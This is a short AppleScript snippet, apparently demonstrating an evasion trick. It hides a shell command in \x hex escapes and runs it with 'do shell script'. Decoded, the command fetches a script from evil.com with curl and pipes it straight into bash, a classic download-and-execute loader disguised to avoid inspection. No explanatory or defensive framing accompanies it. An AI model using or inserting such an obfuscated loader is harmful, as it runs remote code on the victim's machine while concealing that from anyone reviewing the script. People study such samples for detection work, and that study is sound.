-- Obfuscate each character using \x escape codes
set hexstr to "bash -c $'\\x63\\x75\\x72\\x6c\\x20\\x2d\\x73\\x20http://evil.com\\x20|\\x20bash'"
do shell script hexstr
